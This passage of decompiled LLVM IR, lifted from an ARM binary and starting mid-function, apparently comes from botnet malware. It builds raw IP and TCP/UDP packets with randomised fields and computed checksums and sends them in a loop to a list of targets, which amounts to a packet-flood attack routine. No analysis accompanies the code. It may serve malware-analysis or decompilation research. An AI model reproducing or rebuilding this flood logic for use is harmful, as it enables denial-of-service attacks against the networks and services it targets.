  %v0_b20c = load i32, i32* %r4.global-to-local, align 4
  %v1_b20c = add i32 %v0_b20c, 24
  store i32 %v1_b20c, i32* @r5, align 4
  %v3_b210 = add i32 %v0_b20c, 25
  %v4_b210 = inttoptr i32 %v3_b210 to i8*
  store i8 %v5_af38, i8* %v4_b210, align 1
  store i32 %v4_b214, i32* %r2.global-to-local, align 4
  store i32 %v4_b218, i32* %r3.global-to-local, align 4
  store i32 %v1_af5c, i32* %r1.global-to-local, align 4
  %v2_b220 = load i32, i32* @r5, align 4
  %v3_b220 = add i32 %v2_b220, 2
  %v4_b220 = inttoptr i32 %v3_b220 to i16*
  store i16 %v1_b220, i16* %v4_b220, align 2
  %v0_b224 = load i32, i32* %r3.global-to-local, align 4
  %v1_b224 = trunc i32 %v0_b224 to i16
  %v2_b224 = load i32, i32* @r5, align 4
  %v3_b224 = add i32 %v2_b224, 4
  %v4_b224 = inttoptr i32 %v3_b224 to i16*
  store i16 %v1_b224, i16* %v4_b224, align 2
  %v0_b228 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_b228, label %bb79, label %bb78

bb78:                                             ; preds = %bb77
  store i32 64, i32* %r2.global-to-local, align 4
  br label %bb79

bb79:                                             ; preds = %bb77, %bb78
  store i32 17, i32* %r3.global-to-local, align 4
  %v0_b230 = load i32, i32* %r1.global-to-local, align 4
  %v1_b230 = trunc i32 %v0_b230 to i8
  %v2_b230 = load i32, i32* @r5, align 4
  %v3_b230 = add i32 %v2_b230, 8
  %v4_b230 = inttoptr i32 %v3_b230 to i8*
  store i8 %v1_b230, i8* %v4_b230, align 1
  %v0_b234 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_b234, label %bb81, label %bb80

bb80:                                             ; preds = %bb79
  %v1_b234 = load i32, i32* %r2.global-to-local, align 4
  %v2_b234 = trunc i32 %v1_b234 to i16
  %v3_b234 = load i32, i32* @r5, align 4
  %v4_b234 = add i32 %v3_b234, 6
  %v5_b234 = inttoptr i32 %v4_b234 to i16*
  store i16 %v2_b234, i16* %v5_b234, align 2
  br label %bb81

bb81:                                             ; preds = %bb79, %bb80
  %v0_b238 = load i32, i32* %r3.global-to-local, align 4
  %v1_b238 = trunc i32 %v0_b238 to i8
  %v2_b238 = load i32, i32* @r5, align 4
  %v3_b238 = add i32 %v2_b238, 9
  %v4_b238 = inttoptr i32 %v3_b238 to i8*
  store i8 %v1_b238, i8* %v4_b238, align 1
  %v0_b23c = call i32 @rand_next()
  store i32 %v1_b078, i32* %r1.global-to-local, align 4
  store i1 %v2_b248, i1* %cpsr_z.global-to-local, align 1
  %v1_b24c = sub i32 1023, %v0_b23c
  store i32 %v1_b24c, i32* %r3.global-to-local, align 4
  br i1 %v2_b248, label %.thread14, label %.thread15

.thread14:                                        ; preds = %bb81
  %v2_b254 = load i32, i32* @r5, align 4
  %v3_b254 = add i32 %v2_b254, 16
  %v4_b254 = inttoptr i32 %v3_b254 to i32*
  store i32 %v1_b24c, i32* %v4_b254, align 4
  br label %bb82

.thread15:                                        ; preds = %bb81
  %v1_b250 = load i32, i32* %r4.global-to-local, align 4
  %v2_b250 = add i32 %v1_b250, 16
  %v3_b250 = inttoptr i32 %v2_b250 to i32*
  %v4_b250 = load i32, i32* %v3_b250, align 4
  store i32 %v4_b250, i32* %r3.global-to-local, align 4
  %v2_b258 = load i32, i32* @r5, align 4
  %v3_b258 = add i32 %v2_b258, 16
  %v4_b258 = inttoptr i32 %v3_b258 to i32*
  store i32 %v4_b250, i32* %v4_b258, align 4
  br label %bb82

bb82:                                             ; preds = %.thread14, %.thread15
  %v1_b25c = load i32, i32* @r5, align 4
  %v2_b25c = add i32 %v1_b25c, 12
  %v3_b25c = inttoptr i32 %v2_b25c to i32*
  store i32 %v0_b23c, i32* %v3_b25c, align 4
  %v3_b260 = load i32, i32* %stack_var_-44, align 4
  %v0_b264 = load i32, i32* %r4.global-to-local, align 4
  %v1_b264 = add i32 %v0_b264, 44
  store i32 %v1_b264, i32* @r6, align 4
  store i32 %v4_b268, i32* %r2.global-to-local, align 4
  %v1_b26c = add i32 %v3_b260, 1
  store i32 %v1_b26c, i32* @r4, align 4
  store i32 %v4_b270, i32* %r3.global-to-local, align 4
  %v1_b274 = load i32, i32* @sl, align 4
  %v9_b274 = icmp eq i32 %v1_b26c, %v1_b274
  store i1 %v9_b274, i1* %cpsr_z.global-to-local, align 1
  %v0_b278 = load i32, i32* @r7, align 4
  %v1_b278 = trunc i32 %v0_b278 to i16
  %v3_b278 = add i32 %v0_b264, 48
  %v4_b278 = inttoptr i32 %v3_b278 to i16*
  store i16 %v1_b278, i16* %v4_b278, align 2
  %v0_b27c = load i32, i32* %r2.global-to-local, align 4
  %v1_b27c = trunc i32 %v0_b27c to i16
  %v2_b27c = load i32, i32* @r6, align 4
  %v3_b27c = inttoptr i32 %v2_b27c to i16*
  store i16 %v1_b27c, i16* %v3_b27c, align 2
  %v0_b280 = load i32, i32* %r3.global-to-local, align 4
  %v1_b280 = trunc i32 %v0_b280 to i16
  %v2_b280 = load i32, i32* @r6, align 4
  %v3_b280 = add i32 %v2_b280, 2
  %v4_b280 = inttoptr i32 %v3_b280 to i16*
  store i16 %v1_b280, i16* %v4_b280, align 2
  %v0_b284 = load i32, i32* @r4, align 4
  store i32 %v0_b284, i32* %stack_var_-44, align 4
  %v5_b288 = icmp slt i32 %v1_b26c, %v1_b274
  br i1 %v5_b288, label %dec_label_pc_b14c, label %dec_label_pc_b28c

dec_label_pc_b28c:                                ; preds = %bb82
  store i32 %v5_afcc, i32* %r5.global-to-local, align 4
  %v1_b294 = add i32 %v5_afcc, 8
  store i32 %v1_b294, i32* %r4.global-to-local, align 4
  %v0_b2a4.pre.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_b2a0.preheader

dec_label_pc_b2a0.preheader:                      ; preds = %dec_label_pc_b28c, %dec_label_pc_b4e4
  %v0_b2a4.pre = phi i32 [ %v0_b2a4.pre.pre, %dec_label_pc_b28c ], [ 0, %dec_label_pc_b4e4 ]
  %stack_var_-124.0.ph = phi i32 [ %v1_b294, %dec_label_pc_b28c ], [ %v1_b4ec, %dec_label_pc_b4e4 ]
  %storemerge = add i32 %v5_afcc, 52
  store i32 %storemerge, i32* @r8, align 4
  %v2_b498 = icmp eq i32 %v1_b078, 0
  %v2_b4b4 = icmp eq i32 %v1_afec, 0
  %v2_b2e0 = icmp eq i32 %v5_b020, -1
  %v7_b2e0 = icmp eq i32 %v5_b020, -1
  br label %dec_label_pc_b2a0

dec_label_pc_b2a0:                                ; preds = %dec_label_pc_b2a0, %dec_label_pc_b330, %dec_label_pc_b2a0.preheader
  %v0_b2a4 = phi i32 [ %v0_b2a4.pre, %dec_label_pc_b2a0.preheader ], [ 0, %dec_label_pc_b2a0 ], [ %v1_b3cc, %dec_label_pc_b330 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_b2a4 = icmp eq i32 %v0_b2a4, 0
  store i1 %v2_b2a4, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_b2a4, label %dec_label_pc_b2a0, label %dec_label_pc_b2b0

dec_label_pc_b2b0:                                ; preds = %dec_label_pc_b2a0
  br label %dec_label_pc_b2b4

dec_label_pc_b2b4:                                ; preds = %dec_label_pc_b330, %dec_label_pc_b2b0
  %v1_b2c8 = phi i32 [ %v1_b3c8, %dec_label_pc_b330 ], [ 0, %dec_label_pc_b2b0 ]
  %v5_b2b8 = mul i32 %v1_b2c8, 24
  %v1_b2bc = load i32, i32* @sb, align 4
  %v2_b2bc = add i32 %v1_b2bc, %v5_b2b8
  store i32 %v2_b2bc, i32* %r3.global-to-local, align 4
  store i32 %v2_af00, i32* %r4.global-to-local, align 4
  %v1_b2c4 = add i32 %v2_b2bc, 20
  %v2_b2c4 = inttoptr i32 %v1_b2c4 to i8*
  %v3_b2c4 = load i8, i8* %v2_b2c4, align 1
  %v4_b2c4 = zext i8 %v3_b2c4 to i32
  store i32 %v4_b2c4, i32* %r2.global-to-local, align 4
  %v4_b2c8 = mul i32 %v1_b2c8, 4
  %v5_b2c8 = add i32 %v4_b2c8, %v2_af00
  %v6_b2c8 = inttoptr i32 %v5_b2c8 to i32*
  %v7_b2c8 = load i32, i32* %v6_b2c8, align 4
  store i32 %v7_b2c8, i32* @r5, align 4
  %v7_b2cc = icmp eq i8 %v3_b2c4, 31
  store i1 %v7_b2cc, i1* %cpsr_z.global-to-local, align 1
  %v1_b2d0 = add i32 %v7_b2c8, 24
  store i32 %v1_b2d0, i32* @r6, align 4
  %v1_b2d4 = add i32 %v7_b2c8, 44
  store i32 %v1_b2d4, i32* @r7, align 4
  %tmp86 = icmp ult i8 %v3_b2c4, 32
  br i1 %tmp86, label %dec_label_pc_b3dc, label %dec_label_pc_b2dc

dec_label_pc_b2dc:                                ; preds = %dec_label_pc_b2b4
  store i32 %v5_b020, i32* %r1.global-to-local, align 4
  store i1 %v7_b2e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_b2e0, label %dec_label_pc_b43c, label %dec_label_pc_b2e8

dec_label_pc_b2e8:                                ; preds = %dec_label_pc_b3dc, %dec_label_pc_b2dc
  store i32 65535, i32* %r4.global-to-local, align 4
  %v0_b2f0 = load i32, i32* @fp, align 4
  %v9_b2f0 = icmp eq i32 %v0_b2f0, 65535
  store i1 %v9_b2f0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_b2f0, label %dec_label_pc_b454, label %dec_label_pc_b2f8

dec_label_pc_b2f8:                                ; preds = %dec_label_pc_b43c.dec_label_pc_b2f8_crit_edge, %dec_label_pc_b2e8
  %v1_b2fc = phi i32 [ %v1_b2fc.pre, %dec_label_pc_b43c.dec_label_pc_b2f8_crit_edge ], [ 65535, %dec_label_pc_b2e8 ]
  store i32 %v3_b080, i32* %r2.global-to-local, align 4
  %v9_b2fc = icmp eq i32 %v3_b080, %v1_b2fc
  store i1 %v9_b2fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_b2fc, label %dec_label_pc_b47c, label %dec_label_pc_b304

dec_label_pc_b304:                                ; preds = %dec_label_pc_b454.dec_label_pc_b304_crit_edge, %dec_label_pc_b2f8
  %v1_b308 = phi i32 [ %v1_b308.pre, %dec_label_pc_b454.dec_label_pc_b304_crit_edge ], [ %v1_b2fc, %dec_label_pc_b2f8 ]
  store i32 %v3_b084, i32* %r3.global-to-local, align 4
  %v9_b308 = icmp eq i32 %v3_b084, %v1_b308
  store i1 %v9_b308, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_b308, label %dec_label_pc_b490, label %dec_label_pc_b310

dec_label_pc_b310:                                ; preds = %dec_label_pc_b47c, %dec_label_pc_b304
  store i32 %v1_b078, i32* @r4, align 4
  store i1 %v2_b498, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_b498, label %dec_label_pc_b4ac, label %.thread16

.thread16:                                        ; preds = %dec_label_pc_b310
  %v1_b318 = load i32, i32* @r5, align 4
  %v2_b318 = add i32 %v1_b318, 16
  %v3_b318 = inttoptr i32 %v2_b318 to i32*
  %v4_b318 = load i32, i32* %v3_b318, align 4
  store i32 %v4_b318, i32* %r3.global-to-local, align 4
  %v2_b31c = load i32, i32* @r6, align 4
  %v3_b31c = add i32 %v2_b31c, 16
  %v4_b31c = inttoptr i32 %v3_b31c to i32*
  store i32 %v4_b318, i32* %v4_b31c, align 4
  br label %dec_label_pc_b324

dec_label_pc_b324:                                ; preds = %bb85, %.thread16
  store i32 %v1_afec, i32* %r1.global-to-local, align 4
  store i1 %v2_b4b4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_b4b4, label %dec_label_pc_b330, label %dec_label_pc_b4c0

dec_label_pc_b330:                                ; preds = %dec_label_pc_b324, %dec_label_pc_b4ac, %dec_label_pc_b4c0
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_b334 = load i32, i32* @r5, align 4
  %v3_b334 = add i32 %v2_b334, 10
  %v4_b334 = inttoptr i32 %v3_b334 to i16*
  store i16 0, i16* %v4_b334, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_b33c = load i32, i32* @r5, align 4
  store i32 %v0_b33c, i32* @r0, align 4
  %v2_b340 = call i32 @checksum_generic(i32 %v0_b33c, i32 20)
  %v3_b340 = trunc i32 %v2_b340 to i16
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_b348 = load i32, i32* @r5, align 4
  %v4_b348 = add i32 %v3_b348, 10
  %v5_b348 = inttoptr i32 %v4_b348 to i16*
  store i16 %v3_b340, i16* %v5_b348, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_b350 = load i32, i32* %r3.global-to-local, align 4
  %v1_b350 = trunc i32 %v0_b350 to i16
  %v2_b350 = load i32, i32* @r6, align 4
  %v3_b350 = add i32 %v2_b350, 10
  %v4_b350 = inttoptr i32 %v3_b350 to i16*
  store i16 %v1_b350, i16* %v4_b350, align 2
  %v0_b354 = load i32, i32* @r6, align 4
  store i32 %v0_b354, i32* @r0, align 4
  %v2_b358 = call i32 @checksum_generic(i32 %v0_b354, i32 20)
  %v3_b358 = trunc i32 %v2_b358 to i16
  %v3_b35c = load i32, i32* @r6, align 4
  %v4_b35c = add i32 %v3_b35c, 10
  %v5_b35c = inttoptr i32 %v4_b35c to i16*
  store i16 %v3_b358, i16* %v5_b35c, align 2
  store i32 0, i32* @r4, align 4
  %v0_b364 = load i32, i32* @r7, align 4
  store i32 %v0_b364, i32* @r1, align 4
  %v1_b368 = add i32 %v0_b364, 4
  %v2_b368 = inttoptr i32 %v1_b368 to i16*
  %v3_b368 = load i16, i16* %v2_b368, align 2
  %v4_b368 = zext i16 %v3_b368 to i32
  store i32 %v4_b368, i32* %r2.global-to-local, align 4
  store i32 %stack_var_-124.0.ph, i32* %r3.global-to-local, align 4
  %v3_b370 = add i32 %v0_b364, 6
  %v4_b370 = inttoptr i32 %v3_b370 to i16*
  store i16 0, i16* %v4_b370, align 2
  %v0_b374 = load i32, i32* @r6, align 4
  %v4_b378 = call i32 @checksum_tcpudp(i32 %v0_b374, i32 %v0_b364, i32 %v4_b368, i32 %stack_var_-124.0.ph)
  %v5_b378 = trunc i32 %v4_b378 to i16
  %v3_b37c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_b37c, i32* %r2.global-to-local, align 4
  %v3_b380 = mul i32 %v3_b37c, 32
  store i32 %v3_b380, i32* %r3.global-to-local, align 4
  %v0_b384 = load i32, i32* @r5, align 4
  %v1_b384 = add i32 %v0_b384, 16
  %v2_b384 = inttoptr i32 %v1_b384 to i32*
  %v3_b384 = load i32, i32* %v2_b384, align 4
  %v5_b388 = mul i32 %v3_b37c, 24
  store i32 %v5_b388, i32* %r3.global-to-local, align 4
  %v1_b38c = load i32, i32* @sb, align 4
  %v2_b38c = add i32 %v1_b38c, %v5_b388
  store i32 %v2_b38c, i32* @lr, align 4
  %v2_b390 = add i32 %v2_b38c, 4
  %v3_b390 = inttoptr i32 %v2_b390 to i32*
  store i32 %v3_b384, i32* %v3_b390, align 4
  store i32 2, i32* %r1.global-to-local, align 4
  %v3_b398 = load i32, i32* @r7, align 4
  %v4_b398 = add i32 %v3_b398, 6
  %v5_b398 = inttoptr i32 %v4_b398 to i16*
  store i16 %v5_b378, i16* %v5_b398, align 2
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_b3a0 = load i32, i32* %r1.global-to-local, align 4
  %v1_b3a0 = trunc i32 %v0_b3a0 to i16
  %v2_b3a0 = load i32, i32* %r3.global-to-local, align 4
  %v3_b3a0 = load i32, i32* @sb, align 4
  %v4_b3a0 = add i32 %v3_b3a0, %v2_b3a0
  %v5_b3a0 = inttoptr i32 %v4_b3a0 to i16*
  store i16 %v1_b3a0, i16* %v5_b3a0, align 2
  %v0_b3a4 = load i32, i32* @r4, align 4
  %v1_b3a4 = trunc i32 %v0_b3a4 to i16
  %v2_b3a4 = load i32, i32* @lr, align 4
  %v3_b3a4 = add i32 %v2_b3a4, 2
  %v4_b3a4 = inttoptr i32 %v3_b3a4 to i16*
  store i16 %v1_b3a4, i16* %v4_b3a4, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_b3ac = load i32, i32* @r5, align 4
  store i32 %v0_b3ac, i32* %r1.global-to-local, align 4
  %v0_b3b4 = load i32, i32* @r8, align 4
  store i32 %v0_b3b4, i32* %r2.global-to-local, align 4
  %v0_b3b8 = load i32, i32* @lr, align 4
  %v0_b3bc = load i32, i32* %ip.global-to-local, align 4
  %v6_b3c0 = call i32 @__libc_sendto(i32 %v3_b034, i32 %v0_b3ac, i32 %v0_b3b4, i32 16384, i32 %v0_b3b8, i32 %v0_b3bc)
  %v3_b3c4 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_b3c4, i32* %r3.global-to-local, align 4
  %v1_b3c8 = add i32 %v3_b3c4, 1
  %v1_b3cc = load i32, i32* @sl, align 4
  %v9_b3cc = icmp eq i32 %v1_b3c8, %v1_b3cc
  store i1 %v9_b3cc, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_b3c8, i32* %stack_var_-44, align 4
  %v6_b3d4 = icmp slt i32 %v1_b3c8, %v1_b3cc
  br i1 %v6_b3d4, label %dec_label_pc_b2b4, label %dec_label_pc_b2a0

dec_label_pc_b3dc:                                ; preds = %dec_label_pc_b2b4
  %v1_b3dc = add i32 %v2_b2bc, 16
  %v2_b3dc = inttoptr i32 %v1_b3dc to i32*
  %v3_b3dc = load i32, i32* %v2_b3dc, align 4
  store i32 %v3_b3dc, i32* %r4.global-to-local, align 4
  %v0_b3e0 = call i32 @rand_next()
  %v3_b3e4 = load i32, i32* %stack_var_-44, align 4
  %v5_b3ec = mul i32 %v3_b3e4, 24
  %v0_b3f0 = load i32, i32* %r4.global-to-local, align 4
  %v1_b3f0 = and i32 %v0_b3f0, 16711680
  store i32 %v1_b3f0, i32* %ip.global-to-local, align 4
  %v3_b3f4 = udiv i32 %v0_b3f0, 16777216
  %v4_b3f8 = udiv i32 %v1_b3f0, 256
  %v5_b3f8 = or i32 %v4_b3f8, %v3_b3f4
  store i32 %v5_b3f8, i32* %r2.global-to-local, align 4
  %v1_b3fc = load i32, i32* @sb, align 4
  %v2_b3fc = add i32 %v1_b3fc, %v5_b3ec
  store i32 %v2_b3fc, i32* %r1.global-to-local, align 4
  %v1_b400 = and i32 %v0_b3f0, 65280
  store i32 %v1_b400, i32* %r3.global-to-local, align 4
  %v1_b404 = add i32 %v2_b3fc, 20
  %v2_b404 = inttoptr i32 %v1_b404 to i8*
  %v3_b404 = load i8, i8* %v2_b404, align 1
  %v4_b404 = zext i8 %v3_b404 to i32
  store i32 %v4_b404, i32* %ip.global-to-local, align 4
  %v5_b40c = call i32 @llvm.bswap.i32(i32 %v0_b3f0)
  %v7_b410 = lshr i32 %v0_b3e0, %v4_b404
  %v8_b410 = add i32 %v7_b410, %v5_b40c
  store i32 %v8_b410, i32* %r2.global-to-local, align 4
  store i32 %v5_b020, i32* %r1.global-to-local, align 4
  %v5_b42c = call i32 @llvm.bswap.i32(i32 %v8_b410)
  store i32 %v5_b42c, i32* %r3.global-to-local, align 4
  store i1 %v7_b2e0, i1* %cpsr_z.global-to-local, align 1
  %v1_b434 = load i32, i32* @r5, align 4
  %v2_b434 = add i32 %v1_b434, 16
  %v3_b434 = inttoptr i32 %v2_b434 to i32*
  store i32 %v5_b42c, i32* %v3_b434, align 4
  br i1 %v2_b2e0, label %dec_label_pc_b43c, label %dec_label_pc_b2e8

dec_label_pc_b43c:                                ; preds = %dec_label_pc_b3dc, %dec_label_pc_b2dc
  %v0_b43c = call i32 @rand_next()
  store i32 65535, i32* %r4.global-to-local, align 4
  %v0_b448 = load i32, i32* @fp, align 4
  %v9_b448 = icmp eq i32 %v0_b448, 65535
  store i1 %v9_b448, i1* %cpsr_z.global-to-local, align 1
  %v1_b44c = load i32, i32* @r5, align 4
  %v2_b44c = add i32 %v1_b44c, 12
  %v3_b44c = inttoptr i32 %v2_b44c to i32*
  store i32 %v0_b43c, i32* %v3_b44c, align 4
  br i1 %v9_b448, label %dec_label_pc_b454, label %dec_label_pc_b43c.dec_label_pc_b2f8_crit_edge

dec_label_pc_b43c.dec_label_pc_b2f8_crit_edge:    ; preds = %dec_label_pc_b43c
  %v1_b2fc.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_b2f8

dec_label_pc_b454:                                ; preds = %dec_label_pc_b43c, %dec_label_pc_b2e8
  %v0_b454 = call i32 @rand_next()
  %v3_b45c = urem i32 %v0_b454, 65536
  store i32 %v3_b080, i32* %r2.global-to-local, align 4
  %v1_b468 = sub nsw i32 999, %v3_b45c
  store i32 %v1_b468, i32* %r3.global-to-local, align 4
  %v1_b46c = load i32, i32* %r4.global-to-local, align 4
  %v9_b46c = icmp eq i32 %v3_b080, %v1_b46c
  store i1 %v9_b46c, i1* %cpsr_z.global-to-local, align 1
  %v1_b470 = trunc i32 %v0_b454 to i16
  %v2_b470 = load i32, i32* @r5, align 4
  %v3_b470 = add i32 %v2_b470, 4
  %v4_b470 = inttoptr i32 %v3_b470 to i16*
  store i16 %v1_b470, i16* %v4_b470, align 2
  %v0_b474 = load i32, i32* %r3.global-to-local, align 4
  %v1_b474 = trunc i32 %v0_b474 to i16
  %v2_b474 = load i32, i32* @r6, align 4
  %v3_b474 = add i32 %v2_b474, 4
  %v4_b474 = inttoptr i32 %v3_b474 to i16*
  store i16 %v1_b474, i16* %v4_b474, align 2
  br i1 %v9_b46c, label %dec_label_pc_b47c, label %dec_label_pc_b454.dec_label_pc_b304_crit_edge

dec_label_pc_b454.dec_label_pc_b304_crit_edge:    ; preds = %dec_label_pc_b454
  %v1_b308.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_b304

dec_label_pc_b47c:                                ; preds = %dec_label_pc_b454, %dec_label_pc_b2f8
  %v0_b47c = call i32 @rand_next()
  %v1_b47c = trunc i32 %v0_b47c to i16
  store i32 %v3_b084, i32* %r3.global-to-local, align 4
  %v1_b484 = load i32, i32* %r4.global-to-local, align 4
  %v9_b484 = icmp eq i32 %v3_b084, %v1_b484
  store i1 %v9_b484, i1* %cpsr_z.global-to-local, align 1
  %v3_b488 = load i32, i32* @r5, align 4
  %v4_b488 = add i32 %v3_b488, 44
  %v5_b488 = inttoptr i32 %v4_b488 to i16*
  store i16 %v1_b47c, i16* %v5_b488, align 2
  br i1 %v9_b484, label %dec_label_pc_b490, label %dec_label_pc_b310

dec_label_pc_b490:                                ; preds = %dec_label_pc_b47c, %dec_label_pc_b304
  %v0_b490 = call i32 @rand_next()
  %v1_b490 = trunc i32 %v0_b490 to i16
  store i32 %v1_b078, i32* @r4, align 4
  store i1 %v2_b498, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_b498, label %.thread30, label %bb85

.thread30:                                        ; preds = %dec_label_pc_b490
  %v3_b4a031 = load i32, i32* @r7, align 4
  %v4_b4a032 = add i32 %v3_b4a031, 2
  %v5_b4a033 = inttoptr i32 %v4_b4a032 to i16*
  store i16 %v1_b490, i16* %v5_b4a033, align 2
  br label %dec_label_pc_b4ac

bb85:                                             ; preds = %dec_label_pc_b490
  %v1_b49c = load i32, i32* @r5, align 4
  %v2_b49c = add i32 %v1_b49c, 16
  %v3_b49c = inttoptr i32 %v2_b49c to i32*
  %v4_b49c = load i32, i32* %v3_b49c, align 4
  store i32 %v4_b49c, i32* %r3.global-to-local, align 4
  %v3_b4a0 = load i32, i32* @r7, align 4
  %v4_b4a0 = add i32 %v3_b4a0, 2
  %v5_b4a0 = inttoptr i32 %v4_b4a0 to i16*
  store i16 %v1_b490, i16* %v5_b4a0, align 2
  %v1_b4a4 = load i32, i32* %r3.global-to-local, align 4
  %v2_b4a4 = load i32, i32* @r6, align 4
  %v3_b4a4 = add i32 %v2_b4a4, 16
  %v4_b4a4 = inttoptr i32 %v3_b4a4 to i32*
  store i32 %v1_b4a4, i32* %v4_b4a4, align 4
  br label %dec_label_pc_b324

dec_label_pc_b4ac:                                ; preds = %.thread30, %dec_label_pc_b310
  %v0_b4ac = call i32 @rand_next()
  store i32 %v1_afec, i32* %r1.global-to-local, align 4
  store i1 %v2_b4b4, i1* %cpsr_z.global-to-local, align 1
  %v1_b4b8 = load i32, i32* @r6, align 4
  %v2_b4b8 = add i32 %v1_b4b8, 16
  %v3_b4b8 = inttoptr i32 %v2_b4b8 to i32*
  store i32 %v0_b4ac, i32* %v3_b4b8, align 4
  br i1 %v2_b4b4, label %dec_label_pc_b330, label %dec_label_pc_b4c0

dec_label_pc_b4c0:                                ; preds = %dec_label_pc_b324, %dec_label_pc_b4ac
  %v0_b4c0 = load i32, i32* @r7, align 4
  %v1_b4c0 = add i32 %v0_b4c0, 8
  store i32 %v5_afcc, i32* %r1.global-to-local, align 4
  %v2_b4c8 = inttoptr i32 %v1_b4c0 to i16*
  %v3_b4c8 = call i32 @rand_str(i16* %v2_b4c8, i32 %v5_afcc)
  br label %dec_label_pc_b330

dec_label_pc_b4d0:                                ; preds = %dec_label_pc_b044
  %v1_b4d4 = call i32 @__GI___libc_close(i32 %v3_b034)
  br label %dec_label_pc_b4d8

dec_label_pc_b4d8:                                ; preds = %entry, %dec_label_pc_b4d0
  %v1_b4e0 = phi i32 [ %v3_b034, %entry ], [ %v1_b4d4, %dec_label_pc_b4d0 ]
  store i32 %v3_aee4, i32* %r4.global-to-local, align 4
  store i32 %v6_aee4, i32* %r5.global-to-local, align 4
  store i32 %v24_aee4, i32* %fp.global-to-local, align 4
  ret i32 %v1_b4e0

dec_label_pc_b4e4:                                ; preds = %dec_label_pc_b06c
  store i32 %v5_afcc, i32* %r2.global-to-local, align 4
  %v1_b4ec = add i32 %v5_afcc, 8
  store i32 %v1_b4ec, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_b2a0.preheader

; uselistorder directives
  uselistorder i32 %v1_b4ec, { 1, 0 }
  uselistorder i16 %v1_b490, { 1, 0 }
  uselistorder i32 %v0_b454, { 1, 0 }
  uselistorder i32 %v5_b42c, { 1, 0 }
  uselistorder i32 %v0_b3f0, { 1, 2, 0, 3 }
  uselistorder i32 %v1_b3cc, { 1, 2, 0 }
  uselistorder i32 %v1_b3c8, { 2, 0, 3, 1 }
  uselistorder i32 %v3_b37c, { 1, 0, 2 }
  uselistorder i32 %v0_b364, { 1, 0, 2, 3 }
  uselistorder i32 %v7_b2c8, { 1, 0, 2 }
  uselistorder i1 %v7_b2e0, { 2, 1, 0 }
  uselistorder i1 %v2_b4b4, { 2, 3, 1, 0 }
  uselistorder i1 %v2_b498, { 2, 3, 1, 0 }
  uselistorder i32 %v0_b23c, { 1, 0 }
  uselistorder i32 %v4_b1b013, { 1, 0 }
  uselistorder i32 %v3_b0d4, { 1, 0 }
  uselistorder i32 %v3_b0b8, { 1, 2, 0 }
  uselistorder i32 %v1_b0b4, { 1, 0 }
  uselistorder i32 %v1_b078, { 3, 2, 4, 0, 1 }
  uselistorder i32 %v0_b074, { 1, 0, 3, 2 }
  uselistorder i32 %v0_b070, { 1, 0, 2, 3 }
  uselistorder i32 %v0_b06c, { 1, 0, 2, 3 }
  uselistorder i1 %v7_b064, { 1, 0 }
  uselistorder i1 %v7_b038, { 1, 0 }
  uselistorder i32 %v3_b034, { 1, 3, 4, 2, 0 }
  uselistorder i32 %v5_b020, { 5, 3, 0, 4, 1, 2 }
  uselistorder i32 %v1_afec, { 2, 1, 3, 0 }
  uselistorder i32 %v5_afcc, { 7, 6, 5, 4, 1, 3, 2, 0 }
  uselistorder i32 %v1_af80, { 1, 0 }
  uselistorder i32 %v1_af5c, { 2, 1, 0 }
  uselistorder i32 %v5_af54, { 1, 0 }
  uselistorder i8 %v5_af38, { 0, 2, 1 }
  uselistorder i32 %v6_af18, { 1, 0 }
  uselistorder i32 %v2_af00, { 0, 3, 1, 2 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 5, 2, 6, 3, 4 }
  uselistorder i32* %r4.global-to-local, { 0, 5, 7, 6, 1, 2, 3, 4, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 14, 13, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 31, 30, 32, 33, 34, 35, 36, 37, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 22, 21, 23, 24, 26, 25, 27, 28, 30, 29, 31, 32, 34, 33, 36, 35, 0 }
  uselistorder i8 47, { 4, 5, 0, 1, 2, 3, 6, 7, 8, 9 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_b4d8, { 1, 0 }
  uselistorder label %dec_label_pc_b4c0, { 1, 0 }
  uselistorder label %dec_label_pc_b330, { 2, 1, 0 }
  uselistorder label %dec_label_pc_b2a0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_b2a0.preheader, { 1, 0 }
  uselistorder label %bb82, { 1, 0 }
  uselistorder label %bb81, { 1, 0 }
  uselistorder label %bb79, { 1, 0 }
